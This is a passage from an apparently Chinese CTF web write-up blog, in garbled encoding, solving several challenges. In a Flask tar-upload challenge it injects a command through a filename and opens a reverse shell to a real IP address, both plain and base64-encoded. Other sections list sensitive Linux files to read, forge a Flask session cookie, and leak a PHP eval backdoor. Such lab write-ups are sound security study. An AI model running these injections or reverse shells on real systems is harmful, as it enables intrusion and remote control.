class="built_in">format</span>(savepath,directory))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br><span class="line"></span><br><span class="line">    links = []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            extractedfile =os.path.join(root, name)</span><br><span class="line">            <span class="keyword">if</span> os.path.islink(extractedfile):</span><br><span class="line">                os.remove(extractedfile)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no symlink&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>  os.path.isdir(path) :</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no directory&#x27;</span></span><br><span class="line">            links.append(extractedfile)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,links=links)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/uploads/&lt;path:path&gt;&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">path</span>):</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;404&#x27;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ tar</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717094033026.png" alt="image-20240717094033026"></p>
<p>æ ¹æ®æºç ï¼Œåªæœ‰é™åˆ¶é•¿åº¦ï¼Œä¸Šä¼ åè°ƒç”¨ç³»ç»Ÿå‘½ä»¤å¯¹å…¶è¿›è¡Œï¼Œç”±äºæ²¡æœ‰æ–‡ä»¶åçš„é™åˆ¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> not in request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">join</span>(random.<span class="title function_ invoke__">choices</span>(<span class="keyword">string</span>.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.<span class="title function_ invoke__">join</span>(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.<span class="title function_ invoke__">makedirs</span>(directory, mode=<span class="number">0o755</span>, exist_ok=True)</span><br><span class="line">    savepath=os.path.<span class="title function_ invoke__">join</span>(directory, file.filename)</span><br><span class="line">    file.<span class="title function_ invoke__">save</span>(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="title function_ invoke__">format</span>(savepath,directory))</span><br><span class="line">    except:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸ªç‰¹æ€§è¿›è¡ŒRCE</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240717095108731.png" alt="image-20240717095108731"></p>
<p>æ²¡æœ‰å›æ˜¾ï¼Œè€ƒè™‘åå¼¹shell</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717105730290.png" alt="image-20240717105730290"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717110137582.png" alt="image-20240717110137582"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &gt;&amp; /dev/tcp/101.37.27.18/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.tar || echo  YmFzaCA+JiAvZGV2L3RjcC8xMDEuMzcuMjcuMTgvNDQ0NCAwPiYx| base64 -d | bash ||</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717110054704.png" alt="image-20240717110054704"></p>
<h2 id="CISCN-2019åä¸œå—-Web4"><a href="#CISCN-2019åä¸œå—-Web4" class="headerlink" title="[CISCN 2019åä¸œå—]Web4"></a>[CISCN 2019åä¸œå—]Web4</h2><p>æ–‡ä»¶è¯»å–</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717110852604.png" alt="image-20240717110852604"></p>
<p>å°è¯•è¯»å–&#x2F;etc&#x2F;passwd</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717110935262.png" alt="image-20240717110935262"></p>
<p>å°è¯•è¯»å–flagæ–‡ä»¶</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717111006796.png" alt="image-20240717111006796"></p>
<p>å¸¸è§linuxé…ç½®æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwdç”¨æ¥åˆ¤æ–­è¯»å–æ¼æ´çš„å­˜åœ¨</span><br><span class="line">/etc/environmentæ˜¯ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶ä¹‹ä¸€ã€‚ç¯å¢ƒå˜é‡å¯èƒ½å­˜åœ¨å¤§é‡ç›®å½•ä¿¡æ¯çš„æ³„éœ²ï¼Œç”šè‡³å¯èƒ½å‡ºç°secret keyæ³„éœ²çš„æƒ…å†µã€‚</span><br><span class="line">/etc/hostname/etc/hostnameè¡¨ç¤ºä¸»æœºåã€‚</span><br><span class="line">/etc/issueæŒ‡æ˜ç³»ç»Ÿç‰ˆæœ¬ã€‚</span><br><span class="line">/procç›®å½•</span><br><span class="line">/proc/[pid]æŸ¥çœ‹è¿›ç¨‹</span><br><span class="line">/proc/selfæŸ¥çœ‹å½“å‰è¿›ç¨‹</span><br><span class="line">/proc/self/cmdlineå½“å‰è¿›ç¨‹å¯¹åº”çš„ç»ˆç«¯å‘½ä»¤</span><br><span class="line">/proc/self/pwdç¨‹åºè¿è¡Œç›®å½•</span><br><span class="line">/proc/self/ç¯å¢ƒå˜é‡</span><br><span class="line">/sys/class/net/eth0/address macåœ°å€ä¿å­˜ä½</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å½“å‰è¿›ç¨‹å¯¹åº”çš„ç»ˆç«¯å‘½ä»¤</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717111305488.png" alt="image-20240717111305488"></p>
<p>ç›´æ¥è¯»</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717111345242.png" alt="image-20240717111345242"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! Read somethings&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">&#x27;^file.*|flag&#x27;</span>, url, re.IGNORECASE):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> urllib.request.urlopen(url) <span class="keyword">as</span> res:</span><br><span class="line">            <span class="keyword">return</span> res.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>ç»å…¸sessionä¼ªé€ </p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717111948701.png" alt="image-20240717111948701"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Zpc0_w.WMwIMXtSU15Mlrk3Lwa0K8ZD810</span><br></pre></td></tr></table></figure>

<p>åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†</p>
<p>ç¬¬ä¸€éƒ¨åˆ†æ˜¯ä¸¤æ®µbase64ï¼Œä½¿ç”¨è„šæœ¬å°†wwwæ›¿æ¢æˆfuckå³å¯ï¼Œä¸­é—´æ˜¯æ—¶é—´æˆ³ï¼Œæœ€åé¢æ˜¯å®‰å…¨ç­¾å</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717112310264.png" alt="image-20240717112310264"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&#123;&quot; b&quot;:&quot;d3d3LWRhdGE=&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&#123;&quot; b&quot;:&quot;www-data&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è¯»macåœ°å€</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717113214241.png" alt="image-20240717113214241"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ac02521c</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random()*<span class="number">233</span>))</span><br></pre></td></tr></table></figure>

<p>python2è¿è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~/yiyi]</span><br><span class="line">â””â”€<span class="comment"># python2 test.py </span></span><br><span class="line">38.8837558332</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰å‘ï¼Œpython2å’Œ3è·‘å‡ºæ¥æ˜¯ä¸ä¸€æ ·çš„ï¼Œå®¹å™¨ä¸­ç”¨çš„æ˜¯2ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬ä¹Ÿåªèƒ½ç”¨2</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717123413345.png" alt="image-20240717123413345"></p>
<p>æ‹‰åˆ°flask_session_cookie_manager3.pyè·‘</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\31702\<span class="title">Desktop</span>\<span class="title">yiyi</span>\<span class="title">CTF</span>\<span class="title">web</span>\<span class="title">FLASK</span>æ¡†æ¶&gt;<span class="title">python</span> <span class="title">flask_session_cookie_manager3.py</span> <span class="title">encode</span> -<span class="title">s</span> 38.8837558332 -<span class="title">t</span> &quot;&#123;&#x27;<span class="title">username</span>&#x27;:&#x27;<span class="title">fuck</span>&#x27;&#125;&quot;</span></span><br><span class="line"><span class="function"><span class="title">eyJ1c2VybmFtZSI6ImZ1Y2sifQ.ZpdGqA.dt2f0F84oMxkjl0sQQK3_d8E3Xg</span></span></span><br></pre></td></tr></table></figure>

<p>æ›¿æ¢åè·å¾—flag</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717122643018.png" alt="image-20240717122643018"></p>
<h3 id="é™„ï¼šFlask-Session-Cookie-ç®¡ç†å™¨ä½¿ç”¨æŒ‡å—"><a href="#é™„ï¼šFlask-Session-Cookie-ç®¡ç†å™¨ä½¿ç”¨æŒ‡å—" class="headerlink" title="é™„ï¼šFlask Session Cookie ç®¡ç†å™¨ä½¿ç”¨æŒ‡å—"></a>é™„ï¼šFlask Session Cookie ç®¡ç†å™¨ä½¿ç”¨æŒ‡å—</h3><p><strong>ä½¿ç”¨è¯´æ˜</strong></p>
<ul>
<li>ä½¿ç”¨ <code>flask_session_cookie_manager3.py</code> ä¸ Python 3ï¼Œ<code>flask_session_cookie_manager2.py</code> ä¸ Python 2ã€‚</li>
</ul>
<p><strong>ä½¿ç”¨æ–¹æ³•ï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask_session_cookie_manager&#123;2,3&#125;.py [-h] &#123;encode,decode&#125; ...</span><br></pre></td></tr></table></figure>

<p><strong>Flask Session Cookie è§£ç &#x2F;ç¼–ç å·¥å…·</strong></p>
<p><strong>ä½ç½®å‚æ•°ï¼š</strong></p>
<ul>
<li><strong><code>&#123;encode,decode&#125;</code>:</strong> å­å‘½ä»¤å¸®åŠ©<ul>
<li><strong><code>encode</code>:</strong> ç¼–ç </li>
<li><strong><code>decode</code>:</strong> è§£ç </li>
</ul>
</li>
</ul>
<p><strong>å¯é€‰å‚æ•°ï¼š</strong></p>
<ul>
<li><strong><code>-h</code> æˆ– <code>--help</code>:</strong> æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º</li>
</ul>
<p><strong>ç¼–ç </strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask_session_cookie_manager&#123;2,3&#125;.py encode [-h] -s &lt;string&gt; -t &lt;string&gt;</span><br></pre></td></tr></table></figure>

<p><strong>å¯é€‰å‚æ•°ï¼š</strong></p>
<ul>
<li><strong><code>-h</code> æˆ– <code>--help</code>:</strong> æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º</li>
<li><strong><code>-s &lt;string&gt;</code> æˆ– <code>--secret-key &lt;string&gt;</code>:</strong>  å¯†é’¥</li>
<li><strong><code>-t &lt;string&gt;</code> æˆ– <code>--cookie-structure &lt;string&gt;</code>:</strong>  Session Cookie ç»“æ„</li>
</ul>
<p><strong>è§£ç </strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask_session_cookie_manager&#123;2,3&#125;.py decode [-h] [-s &lt;string&gt;] -c &lt;string&gt;</span><br></pre></td></tr></table></figure>

<p><strong>å¯é€‰å‚æ•°ï¼š</strong></p>
<ul>
<li><strong><code>-h</code> æˆ– <code>--help</code>:</strong> æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º</li>
<li><strong><code>-s &lt;string&gt;</code> æˆ– <code>--secret-key &lt;string&gt;</code>:</strong>  å¯†é’¥</li>
<li><strong><code>-c &lt;string&gt;</code> æˆ– <code>--cookie-value &lt;string&gt;</code>:</strong> Session Cookie å€¼</li>
</ul>
<p><strong>ç¤ºä¾‹</strong></p>
<p><strong>ç¼–ç </strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s <span class="string">&#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span> -t <span class="string">&#x27;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br><span class="line">eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw</span><br></pre></td></tr></table></figure>

<p><strong>æ³¨æ„ï¼š</strong> Session Cookie ç»“æ„å¿…é¡»æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ Python å­—å…¸</p>
<p><strong>è§£ç </strong></p>
<p><strong>ä½¿ç”¨å¯†é’¥ï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c <span class="string">&#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span> -s <span class="string">&#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span></span><br><span class="line">&#123;u<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, u<span class="string">&#x27;number&#x27;</span>: <span class="string">&#x27;326410031505&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ä¸ä½¿ç”¨å¯†é’¥ (è¾“å‡ºæ ¼å¼è¾ƒå·®)ï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c <span class="string">&#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;number&quot;</span>:&#123;<span class="string">&quot; b&quot;</span>:<span class="string">&quot;MzI2NDEwMDMxNTA1&quot;</span>&#125;,<span class="string">&quot;username&quot;</span>:&#123;<span class="string">&quot; b&quot;</span>:<span class="string">&quot;YWRtaW4=&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="FSCTF-2023-ç­¾åˆ°plus"><a href="#FSCTF-2023-ç­¾åˆ°plus" class="headerlink" title="[FSCTF 2023]ç­¾åˆ°plus"></a>[FSCTF 2023]ç­¾åˆ°plus</h2><p>dirsearchæ‰«åˆ°shell.phpï¼Œè®¿é—®å‘ç°æ˜¯php info </p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717135734930.png" alt="image-20240717135734930"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46203060/article/details/129350280">PHPï¼œ&#x3D;7.4.21 Development Serveræºç æ³„éœ²æ¼æ´_php7.4.21æ¼æ´-CSDNåšå®¢</a></p>
<p>å…³é—­bpçš„Content-LengthåŠŸèƒ½</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717140053098.png" alt="image-20240717140053098"></p>
<p>è¯·æ±‚åŒ…åªç•™è¿™å‡ å¥å³å¯</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717140347431.png" alt="image-20240717140347431"></p>
<p>ä¿å­˜è‡³txtæŸ¥çœ‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">0.9</span> <span class="number">200</span> OK</span><br><span class="line">Host: node4.anna.nssctf.cn:<span class="number">28393</span></span><br><span class="line">Date: Wed, <span class="number">17</span> Jul <span class="number">2024</span> <span class="number">06</span>:<span class="number">03</span>:<span class="number">28</span> GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">443</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">$ğŸ˜€=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">$ğŸ˜=<span class="string">&quot;b&quot;</span>;</span><br><span class="line">$ğŸ˜‚=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">$ğŸ¤£=<span class="string">&quot;d&quot;</span>;</span><br><span class="line">$ğŸ˜ƒ=<span class="string">&quot;e&quot;</span>;</span><br><span class="line">$ğŸ˜„=<span class="string">&quot;f&quot;</span>;</span><br><span class="line">$ğŸ˜…=<span class="string">&quot;g&quot;</span>;</span><br><span class="line">$ğŸ˜†=<span class="string">&quot;h&quot;</span>;</span><br><span class="line">$ğŸ˜‰=<span class="string">&quot;i&quot;</span>;</span><br><span class="line">$ğŸ˜Š=<span class="string">&quot;j&quot;</span>;</span><br><span class="line">$ğŸ˜‹=<span class="string">&quot;k&quot;</span>;</span><br><span class="line">$ğŸ˜=<span class="string">&quot;l&quot;</span>;</span><br><span class="line">$ğŸ˜=<span class="string">&quot;m&quot;</span>;</span><br><span class="line">$ğŸ˜˜=<span class="string">&quot;n&quot;</span>;</span><br><span class="line">$ğŸ˜—=<span class="string">&quot;o&quot;</span>;</span><br><span class="line">$ğŸ˜™=<span class="string">&quot;p&quot;</span>;</span><br><span class="line">$ğŸ˜š=<span class="string">&quot;q&quot;</span>;</span><br><span class="line">$ğŸ™‚=<span class="string">&quot;r&quot;</span>;</span><br><span class="line">$ğŸ¤—=<span class="string">&quot;s&quot;</span>;</span><br><span class="line">$ğŸ¤©=<span class="string">&quot;t&quot;</span>;</span><br><span class="line">$ğŸ¤”=<span class="string">&quot;u&quot;</span>;</span><br><span class="line">$ğŸ¤¨=<span class="string">&quot;v&quot;</span>;</span><br><span class="line">$ğŸ˜=<span class="string">&quot;w&quot;</span>;</span><br><span class="line">$ğŸ˜‘=<span class="string">&quot;x&quot;</span>;</span><br><span class="line">$ğŸ˜¶=<span class="string">&quot;y&quot;</span>;</span><br><span class="line">$ğŸ™„=<span class="string">&quot;z&quot;</span>;</span><br><span class="line"></span><br><span class="line">$ğŸ˜­ = $ğŸ˜™. $ğŸ˜€. $ğŸ¤—. $ğŸ¤—. $ğŸ¤©. $ğŸ˜†. $ğŸ™‚. $ğŸ¤”;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ğŸ‘½ğŸ¦&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($ğŸ˜­(<span class="variable">$_GET</span>[<span class="string">&#x27;ğŸ‘½ğŸ¦&#x27;</span>]));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å‘½ä»¤æ‰§è¡Œå³å¯</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240717140821697.png" alt="image-20240717140821697"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717140853901.png" alt="image-20240717140853901"></p>
<h2 id="HNCTF-2022-Week1-Challenge-rce"><a href="#HNCTF-2022-Week1-Challenge-rce" class="headerlink" title="[HNCTF 2022 Week1]Challenge__rce"></a>[HNCTF 2022 Week1]Challenge__rce</h2><p>getä¼ å‚hintå¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span 